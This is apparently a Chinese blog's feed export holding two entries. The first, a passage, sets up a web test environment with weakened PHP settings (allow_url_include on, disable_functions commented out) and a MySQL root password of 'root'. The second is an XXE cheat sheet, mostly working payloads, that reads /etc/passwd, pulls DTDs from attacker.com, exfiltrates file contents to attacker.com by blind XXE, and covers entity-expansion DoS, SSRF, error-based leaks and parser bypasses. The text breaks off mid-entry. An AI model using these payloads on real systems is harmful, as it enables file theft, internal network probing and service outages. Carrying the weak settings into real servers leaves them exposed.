/etc/apache2/mods-available/mpm_prefork.conf</span><br></pre></td></tr></table></figure><p> 开启 URL 重写，设置默认的 ServerName，并重启 Apache。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/AllowOverride None/AllowOverride ALL/g&quot;</span> /etc/apache2/apache2.conf</span><br><span class="line">sudo a2enmod rewrite</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ServerName localhost&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/apache2/apache2.conf</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h1 id="Server-Side-Languages"><a href="#Server-Side-Languages" class="headerlink" title="Server-Side Languages"></a>Server-Side Languages</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y php libapache2-mod-php</span><br></pre></td></tr></table></figure><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y <span class="string">&quot;php-(bcmath|gmp|ldap|simplexml|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h3 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span>;</span><br><span class="line">sudo php composer-setup.php --install-dir=/usr/bin --filename=composer;</span><br><span class="line"><span class="built_in">rm</span> composer-setup.php</span><br></pre></td></tr></table></figure><h3 id="PHP-Multi-Version"><a href="#PHP-Multi-Version" class="headerlink" title="PHP Multi-Version"></a>PHP Multi-Version</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php &amp;&amp; sudo add-apt-repository ppa:ondrej/apache2</span><br><span class="line"><span class="comment"># Install another php.</span></span><br><span class="line">sudo apt-get install -y php5.6 php7.4 php8.1</span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php5.6-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php7.4-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php8.1-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line"><span class="comment"># Switch php for apache. Disable current used php.</span></span><br><span class="line">sudo a2dismod php-7.4</span><br><span class="line"><span class="comment"># Enable the php which you want to use.</span></span><br><span class="line">sudo a2enmod php-8.1</span><br><span class="line"><span class="comment"># Reboot server.</span></span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line"><span class="comment"># Switch php for commandline.</span></span><br><span class="line">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure><h3 id="PHP-INI-Configuration"><a href="#PHP-INI-Configuration" class="headerlink" title="PHP INI Configuration"></a>PHP INI Configuration</h3><p> 仅在测试环境下可能会用到的配置，为了便于 debug。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/disable_functions = /; disable_functions = /g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_execution_time = 30/max_execution_time = 60/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_input_time = 60/max_input_time = -1/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;max_input_vars = 1000/max_input_vars = 3000/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/memory_limit = 128M/memory_limit = 256M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_errors = Off/display_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_startup_errors = Off/display_startup_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/post_max_size = 8M/post_max_size = 32M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/allow_url_include = Off/allow_url_include = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;mysqli.allow_local_infile = On/mysqli.allow_local_infile = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.gc_maxlifetime = 1440/session.gc_maxlifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.cookie_lifetime = 0/session.cookie_lifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y default-jdk</span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y python2 python3 python3-pip python3-flask python3-django python3-requests python3-venv</span><br></pre></td></tr></table></figure><h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y golang-go</span><br></pre></td></tr></table></figure><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br></pre></td></tr></table></figure><h2 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y gcc g++</span><br></pre></td></tr></table></figure><h1 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p> 注意安装完成后需要从 <code>/etc/mysql/debian.cnf</code> 中获取默认的 MySQL 用户名和密码，用此用户名密码登录成功后再修改 root 的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y mysql-server mysql-client</span><br><span class="line"><span class="comment"># Get mysql default username.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep user</span><br><span class="line"><span class="comment"># Get mysql default password.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep password</span><br><span class="line"><span class="comment"># Using it to login mysqsl.</span></span><br><span class="line">mysql -u xxxx -p</span><br><span class="line"><span class="comment"># Change password to &quot;root&quot;.</span></span><br><span class="line">mysql&gt; alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified with mysql_native_password by <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y redis</span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y sqlite3</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y postgresql</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE CheatSheet</title>
      <link href="/2022/05/04/XXE-CheatSheet/"/>
      <url>/2022/05/04/XXE-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h1><p>XXE(XML External Entity, XML 外部实体)，在一个 XML 文档中，攻击者可以直接控制 DTD 中 XML 实体的定义，引用外部实体，导致 SSRF。</p><p>使用 XML 的地方有：</p><ul><li>文档格式 OOXML, ODF, PDF, RSS, DOCX…</li><li>图片格式 SVG, EXIF Headers…</li><li>配置文件</li><li>网络协议 WebDAV, CalDAV, XMLRPC, SOAP, REST, XMPP, SAML, XACML…</li></ul><p>XXE 特征：</p><ul><li>PHP: <code>simplexml_load_file</code>, <code>xml_parse</code>, <code>simplexml_load_string</code></li><li>Java: <code>DOM</code>, <code>SAX</code>, <code>JDOM</code>, <code>DOM4J</code></li><li>Python: <code>SAX</code>, <code>DOM</code>, <code>ElementTree</code></li></ul><blockquote><p>在某些 xml 解析器中，尽管禁用了外部实体，但是解析器会在 DTD 定义阶段就对 URL 进行请求，但是不会展开该实体。<br>libxml2.9.0 后默认不解析外部实体。<br>simplexml_load_file 旧版本默认解析外部实体，新版本要指定第三個参数 LIBXML_NOENT</p></blockquote><p>XXE 有以下几种利用方法（以文件读取为例）。</p><h2 id="普通实体"><a href="# 普通实体" class="headerlink" title="普通实体"></a>普通实体 </h2><p> 引用外部普通实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：元素类型主要有 PCDATA 和 CDATA 两种，PCDATA 中的文本会被当成 XML 解析，CDATA 中的文本则不会。定义 b 为 CDATA 来避免 &amp;c; 中出现特殊字符导致 XML 解析器解析失败而报错。<br>XML 中有 5 个预定义的实体：&amp;lt;，&amp;gt;，&amp;amp;，&amp;apos; 和 &amp;quot;，分别替换 &lt; &gt; &amp; ‘和”。字符实体也可以直接通过 Ascii 码使用，例如 % 的实体为 &amp;#x25;。</p></blockquote><p>当要读取的文件中存在一些复杂的字符（例如<code>/etc/fstab</code>），可能会引起 xml 解析器报错时，可以使用参数实体拼接绕过，如下所示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/fstab&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参数实体外部 DTD"><a href="# 参数实体外部 DTD" class="headerlink" title="参数实体外部 DTD"></a>参数实体外部 DTD</h2><p>利用参数实体引用外部 DTD 文件。</p><blockquote><p>注意：参数实体只能在 DTD 中引用，不能在声明前引用，也不能在实体声明内部引用。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="普通实体外部 DTD"><a href="# 普通实体外部 DTD" class="headerlink" title="普通实体外部 DTD"></a>普通实体外部 DTD</h2><p>通过普通实体引用外部 DTD 文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>通过定义数量巨大的实体可以造成 DOS 攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a2 会被扩展为很多 a1，每个 a1 又会被扩展为很多 a0，这样的嵌套扩展会严重拖慢 XML 解析器的速度。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>外部实体引用可以访问一个 URL，造成 SSRF，通过 SSRF 可以读取文件，攻击内网等。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;http://a.com/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE 盲注"><a href="#XXE 盲注" class="headerlink" title="XXE 盲注"></a>XXE 盲注 </h2><p> 无回显的情况下可以将数据通过 HTTP 发送到远程服务器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;</span>&gt;</span> </span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>注意要将 % 实体编码为 &amp;#x25;</p></blockquote><p>攻击流程：</p><ol><li>首先展开<code>%remote;</code>，请求远程服务器中的<code>evil.dtd</code>。</li><li>展开 <code>evil.dtd</code> 中的<code>%payload;</code>。</li><li>展开 <code>evil.dtd</code> 中的<code>%send;</code>。</li><li>展开 <code>%send;</code> 中的<code>%file;</code>，读取文件。</li><li>最后调用 <code>%send;</code>，将展开的<code>%file;</code> 发送到远程服务器中。</li></ol><blockquote><p>在 PHP 环境下可以将数据通过 base64 编码（利用 filter）通过 url 发送到远程服务器以避免 url 坏字符。</p></blockquote><h2 id="报错注入"><a href="# 报错注入" class="headerlink" title="报错注入"></a>报错注入 </h2><p> 类似 SQL 注入的报错注入，XXE 也可以通过报错注入返回一些额外信息，如下所示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">NUMBER</span> <span class="string">&#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %NUMBER;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以下 Payload 可能也会引起 XML 解析器错误：</p><ul><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY err SYSTEM &#39;file:///some&#39;%pay; gif&gt;&quot;&gt; %trick;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY :%pay;&gt;&quot;&gt; %trick;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;%pay;&#39;&gt;&quot;&gt; %trick; %err;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY :%pay;&gt;&quot;&gt; %trick;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;%pay;&#39;&gt;&quot;&gt; %trick; %err;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;http%pay;:/127.0.0.1/&#39;&gt;&quot;&gt; %trick; %err;</code></li><li><code>&lt;!DOCTYPE html [&lt;!ENTITY % foo SYSTEM &quot;file:///c:/boot.ini&quot;&gt; %foo;]&gt;</code></li></ul><h2 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="其他 Payload"><a href="# 其他 Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h1><h2 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li>可以用 <code>PUBLIC</code> 代替 <code>SYSTEM</code>，二者完全等价。</li><li>修改文档编码格式，例如 <code>UTF-7</code>，<code>UTF-16</code>等。</li></ul><p>其他绕过方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE :. <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span 